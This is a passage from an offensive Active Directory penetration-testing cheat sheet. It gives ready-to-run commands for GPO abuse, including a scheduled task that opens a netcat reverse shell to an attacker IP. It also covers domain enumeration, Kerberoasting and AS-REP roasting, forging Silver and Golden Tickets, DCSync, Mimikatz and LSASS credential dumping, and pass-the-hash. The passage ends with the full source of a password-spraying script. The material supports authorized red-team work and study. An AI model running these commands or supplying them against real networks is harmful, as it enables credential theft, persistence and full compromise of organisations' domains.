Get-DomainGMSA -Properties msDS-ManagedPassword
# ldapsearch (Linux)
ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword

14.14 Group Policy Object (GPO) Abuse

If you hold write permissions on a GPO, you can inject a malicious scheduled task or local-admin entry that executes the next time any machine in the GPO's scope applies policy. Guides: Hacktricks GPO Guide, InternalAllTheThings Advanced Guide. Tools: PowerView.ps1, SharpGPOAbuse.exe (GitHub).

GPO Abuse Technique SharpGPOAbuse Flag Effect Noise Level When to Prefer
Add local administrator --AddLocalAdmin --UserAccount <user> User added to local Administrators on all scoped machines Low Stable access needed; no callback infrastructure
Computer scheduled task (reverse shell) --AddComputerTask --Command cmd.exe --Arguments /c nc... SYSTEM-level code runs on next policy refresh on all scoped machines High Immediate shell needed; callback handler ready
User scheduled task --AddUserTask --Command cmd.exe Code runs as the next user who logs into a scoped machine Medium Targeting a specific user's session
Registry key persistence --AddAutorun --Command <path> Registry run key set; executes on every user logon Low Long-term persistence without recurring task noise 
# Import PowerView
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
# List all GPOs
Get-NetGPO | select displayname

# Find GPOs where your SID has write-equivalent rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
# Enumerate a specific GPO
Get-GPO -Name "[DisplayName]"
Get-GPO -Guid [gpo_id]

# Verify edit permissions
Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
# Inject a reverse shell scheduled task
./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"

# Add a user to local Administrators
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"

# Force immediate policy application
gpupdate /force

14.15 Enumerating Domain Controller

Use multiple tools in parallel to cross-validate findings; each gives a different view of the same DC.

Tool Protocol / Port Credentials Required Best Used For OPSEC Noise
enum4linux / enum4linux-ng SMB 445, RPC 135, LDAP 389 Optional (anon works on many DCs) Initial recon — users, shares, OS, password policy Medium — bulk RPC calls
CrackMapExec (SMB) SMB 445 Yes (or PTH) Spray, user/share/group enum, hash dump, module execution High — many auth events logged
ldapsearch LDAP 389 / LDAPS 636 Optional (anon base query) Raw AD attribute queries, gMSA / SPN / user filter Low-Medium — LDAP queries less monitored
rpcclient RPC 135 / SMB 445 Optional (null session) User/group/share enum, printer check, SID lookup Medium
Kerbrute Kerberos 88 None Username enumeration without LDAP; password spray Low — uses pre-auth error codes
BloodHound / SharpHound SMB 445, LDAP 389, RPC Yes — domain user Attack path mapping, ACL analysis, privilege escalation routes High — bulk LDAP + SMB collection
Nmap scripts Multiple (88, 135, 389, 445, 636) Optional Port/service confirmation; LDAP/SMB script checks Medium — SYN/service probes visible 
enum4linux -U <DOMAIN_IP>
enum4linux -a <DOMAIN_IP>
enum4linux -u <VALID_USERNAME> -p <VALID_PASSWORD> <DOMAIN_IP>
enum4linux -a <DOMAIN_IP> > domain_enum.txt
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --shares
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --gpp-password
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --sam
crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --lsa
crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --users
# Anonymous base query
ldapsearch -x -h <DOMAIN_IP> -s base

# Enumerate domain users
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate computers
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=computer)" name

# Dump entire LDAP tree
ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local"
rpcclient -U <VALID_USERNAME>%<VALID_PASSWORD> <DOMAIN_IP>
smbclient -L //<DOMAIN_IP> -U <VALID_USERNAME>%<VALID_PASSWORD>
smbclient //<DOMAIN_IP>/NETLOGON -U <VALID_USERNAME>%<VALID_PASSWORD>
smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get important_file.txt"
# Collect all BloodHound data
SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -dc <DOMAIN_IP>
# Scan common AD/DC ports
nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>
nmap --script ldap-search -p389 <DOMAIN_IP>
# Username enumeration via Kerberos
kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt

# Password spray via Kerberos
kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress
Get-ADGroup -Filter * | Select-Object Name, GroupScope

14.16 Enumerating with CrackMapExec

CrackMapExec supports SMB, LDAP, and MSSQL protocols; use valid credentials or an NTLM hash to combine flags and pivot quickly from enumeration to exploitation. The actively maintained fork is NetExec (nxc) with nearly identical syntax.

CME Protocol Key Flag(s) What It Returns Typical Follow-up
SMB --users Domain user list with badpwdcount Spray; target low-badpwd accounts
SMB --shares Readable/writable share names Mount interesting shares with smbclient
SMB --sam Local SAM hashes (requires admin) PTH with recovered local admin hash
SMB --lsa LSA secrets — cached domain creds, svc account passwords Crack or PTH service account credentials
SMB --pass-pol Lockout threshold, complexity, history Calibrate spray window to avoid lockouts
SMB -M gpp_password Decrypted GPP cpassword values Use credential for local admin PTH across domain
SMB -M laps LAPS local admin passwords per computer Authenticate as local admin to that specific machine
LDAP --users / --groups Full AD user/group objects Feed into Kerberoast / AS-REP enumeration
MSSQL --dbs / -q Database list; query results xp_cmdshell for code exec if sysadmin 
# Locate active DCs - SMB OS discovery
nmap -p 445 --script smb-os-discovery <IP_RANGE>
# Enumerate users
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users -d <DOMAIN_NAME>
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAME>
# Enumerate shares
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares -d <DOMAIN_NAME>
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NAME>
# Enumerate groups
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --groups -d <DOMAIN_NAME>
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NAME>
# Password policy - check lockout threshold before spraying
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_NAME>
# Local accounts
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
# LDAP enumeration
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --users
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --groups
# MSSQL enumeration
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> --dbs
crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"

15. Active Directory Exploitation

AD attacks split into offline hash cracking (AS-REP Roasting, Kerberoasting) and ticket/hash reuse (Pass-the-Hash, Pass-the-Ticket, Silver/Golden Tickets); DCSync yields raw hashes that feed both paths.

Attack Precondition Key Tool / Command Hashcat Mode Result / Goal
AS-REP Roasting Target account has DONT_REQUIRE_PREAUTH set; no credentials needed for unauthenticated enumeration impacket-GetNPUsers / Rubeus.exe asreproast 18200 (RC4 $krb5asrep$23$) / 19900 (AES-256 $krb5asrep$18$) Offline plaintext password of the vulnerable account
Kerberoasting Any valid domain account; target service account must have an SPN registered impacket-GetUserSPNs -request / Rubeus.exe kerberoast 13100 (RC4 $krb5tgs$23$) / 19700 (AES-256 $krb5tgs$18$) Offline plaintext password of the service account
Silver Ticket Service account NTLM hash (from Kerberoast, DCSync, or sekurlsa dump); domain SID; target SPN mimikatz # kerberos::golden /service: /rc4: /target: N/A (no cracking — forge offline) Forged TGS for a single service; access without touching the DC
Golden Ticket KRBTGT account NTLM hash; domain SID (requires DA or DCSync capability) mimikatz # lsadump::dcsync /user:krbtgt then kerberos::golden /krbtgt: N/A (no cracking — forge offline) Forged TGT claiming any identity; domain-wide persistence
DCSync Account with Replicating Directory Changes All ACE (Domain Admins, Enterprise Admins, or delegated) impacket-secretsdump domain/admin@dc-ip / mimikatz # lsadump::dcsync 1000 (NT hash) after dump All domain NT hashes including KRBTGT; feeds PtH, Golden Ticket, and cracking
Overpass-the-Hash (PtT via PtH) User's NTLM hash (from LSASS, SAM, or DCSync); network reachability to a KDC mimikatz # sekurlsa::pth /ntlm: /user: then request a TGS from spawned session N/A (no cracking) Converts an NTLM hash into a valid Kerberos TGT; enables full Kerberos-based lateral movement

15.1 AS-REP Roasting

Accounts with DONT_REQUIRE_PREAUTH return an AS-REP blob encrypted with the user's hash — crackable offline without any domain credentials.

  • RC4 hash ($krb5asrep$23$) cracks with mode 18200; AES-256 ($krb5asrep$18$) uses mode 19900 and is much slower.
  • Sync clock before attacking: sudo ntpdate [dc-ip] — Kerberos rejects requests if skew exceeds 5 minutes.
  • BloodHound query Find AS-REP Roastable Users flags all eligible accounts instantly.
# Find accounts with DoesNotRequirePreAuth set
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
# AS-REP Roast with Rubeus (Windows)
Rubeus.exe asreproast
Rubeus.exe asreproast /nowrap
# Extract AS-REP hashes with impacket-GetNPUsers (Kali)
impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]
GetNPUsers.py [domain]/[user]:[password]@[dc-ip] -no-pass
# Crack AS-REP hash offline
hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt

15.2 Kerberoasting

Any authenticated domain user can request a TGS for any SPN; the ticket is encrypted with the service account's hash and can be cracked offline.

  • Prioritise human-managed service accounts over MSAs/gMSAs (auto-rotating, practically uncrackable).
  • RC4 hash ($krb5tgs$23$) cracks with mode 13100; AES-256 ($krb5tgs$18$) uses mode 19700.
  • Requesting many TGS tickets quickly generates 4769 events — target high-value SPNs selectively.
# Enumerate SPNs
impacket-GetUserSPNs [domain.com]/[user]:[password] -dc-ip [dc-ip]
# Request TGS tickets and save (Kali)
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]
GetUserSPNs.py [domain]/[user]:[password]@[dc-ip] -request
# Extract TGS from memory with Rubeus (Windows)
Rubeus.exe kerberoast
Rubeus.exe kerberoast /outfile:[output_file].kerberoast
# Crack TGS hash offline
hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt

15.3 Silver Tickets

Forge a TGS for a specific service using the service account's NTLM hash — bypasses the DC entirely and is harder to detect.

  • Valid only for the single SPN it was forged for; use a Golden Ticket for domain-wide access.
  • Useful SPNs to forge: cifs (SMB), http (WinRM/web), mssql, host (WMI/scheduling).
  • Server 2022 / DFL 2022 enables PAC signature verification — the service contacts the DC to validate, potentially breaking Silver Tickets.
# Find service accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Get Domain SID
(Get-ADDomain).DomainSID
whoami /user

# Get target DC / server name
Get-ADDomainController -Filter *
netdom query dc
# Extract NTLM hash via Mimikatz
mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
mimikatz # lsadump::dcsync /user:HTTP/server01
# Forge Silver Ticket
mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]

# Inject ticket into current session
mimikatz # kerberos::ptt silver_ticket.kirbi

# Verify and use
klist
dir \\targetserver\sharedfolder

15.4 Golden Tickets

Forge a TGT using the KRBTGT hash — grants persistent impersonation of any user across the entire domain.

  • Remains valid until krbtgt is rotated twice; the first rotation alone does not invalidate existing tickets.
  • Add Enterprise Admins SID (S-1-5-21-<root-domain-sid>-519) via /sids: for cross-forest access.
  • A Diamond Ticket (Rubeus /tgtdeleg) modifies a legitimate TGT's PAC instead of forging from scratch, evading "TGT without prior AS-REQ" detection.
# Get Domain SID and KRBTGT hash
(Get-ADDomain).DomainSID
whoami /user
# Dump KRBTGT hash via DCSync
mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
# Forge Golden Ticket
mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500

# Inject ticket into current session
mimikatz # kerberos::ptt golden_ticket.kirbi

# Verify and use
klist
net use \\domaincontroller\C$ /user:[DesiredUsername]

15.5 Domain Controller Synchronization (DC Sync)

Emulate a DC replication partner to pull all password hashes directly — requires Replicating Directory Changes All rights.

  • Generates event 4662 on the DC; modern EDR alerts on non-DC accounts performing replication.
  • Target krbtgt, Administrator, and identified service accounts rather than dumping the entire NTDS to reduce noise.
  • impacket-secretsdump accepts -hashes LM:NT to run DCSync from Kali using only an NT hash — no plaintext needed.
# Confirm replication privileges
Get-ADGroupMember -Identity "Domain Admins"
# DCSync from Kali (impacket-secretsdump)
impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]
# DCSync from Windows (Mimikatz)
mimikatz # lsadump::dcsync /domain:[domain.com]
mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
# Crack dumped NT hashes
hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt

15.6 Cached AD Credentials

Extract NTLM hashes from LSASS memory or the registry cache on a compromised domain-joined host — available even without DC connectivity. Many additional Mimikatz commands are covered in Section 6.12.

  • Windows 8.1+ / Server 2012 R2+ disable WDigest by default; empty password fields mean WDigest is off.
  • Prefer LSASS minidump via comsvcs.dll (no Mimikatz on disk): rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass-pid> C:\Temp\lsass.dmp full, then analyse offline with mimikatz # sekurlsa::minidump lsass.dmp.
  • Credential Guard (Windows 10/11 + Server 2016+) stores hashes in a VTL-1 enclave — sekurlsa::logonpasswords returns empty NTLM fields when enabled.
# Elevate and dump credentials with Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate

# Logon session credentials
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos

# LSA / SAM / domain cache dumps
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::cache
# Crack cached NT hashes
hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt

15.7 NTLM Authentication

NTLM is a challenge-response protocol used when Kerberos is unavailable; its main attack surfaces are Pass-the-Hash and relay attacks.

  • Pass-the-Hash: the NT hash is the authentication secret — knowing it is sufficient to authenticate without the plaintext.
  • NTLMv1 responses (hashcat mode 5500) crack much faster than NTLMv2 (mode 5600); many environments still negotiate NTLMv1 if misconfigured.
  • When SMB signing is not enforced, captured Net-NTLMv2 hashes from Responder can be relayed with impacket-ntlmrelayx — often faster than cracking.
  • Overpass-the-Hash: run sekurlsa::pth then perform a Kerberos AS-REQ from the spawned process to convert an NT hash into a TGT for Kerberos-only services.
# Dump NTLM hash from memory
mimikatz # sekurlsa::logonpasswords

# Spawn a process authenticated with the captured hash
mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]

# Access remote resource from the spawned session
dir \\targetserver\sharedfolder

15.8 Kerberos Authentication

Kerberos tickets are stored in memory as .kirbi structures; exporting and injecting a TGT or TGS grants the same access as the original owner — no hash needed.

  • Default TGT lifetime is 10 hours; a stolen TGT expires with its original window — steal one near the start of a session.
  • Unconstrained delegation hosts (TrustedForDelegation=True) cache TGTs of any authenticating user; gain SYSTEM and run Rubeus.exe monitor /interval:5 /nowrap to passively harvest DA TGTs.
  • Clock skew >5 minutes causes KRB_AP_ERR_SKEW — always sync time before any Kerberos attack.
# Export all Kerberos tickets from memory to .kirbi files
mimikatz # sekurlsa::tickets /export

# Inject a stolen TGT into the current session
mimikatz # kerberos::ptt TGT_ticket.kirbi

# Access resources using the injected ticket
klist
dir \\targetserver\sharedfolder

15.9 Password Attacks

Spray one password at a time across many accounts to stay under lockout thresholds — check domain policy first with net accounts or Get-ADDefaultDomainPasswordPolicy.

15.9.1 Spray-Passwords.ps1

Queries the PDC directly — no RSAT or admin required; reads lockout policy before each round.

# Spray single password against all non-admin accounts
.\Spray-Passwords.ps1 -Pass [password] -Admin

Full source of Spray-Passwords.ps1 (save as Spray-Passwords.ps1 on the target):

<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }

    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}

    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file

        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."

   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects

        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else
                    {
                        $now = Get-Date

                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"

                                   # Try the auth with current password
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

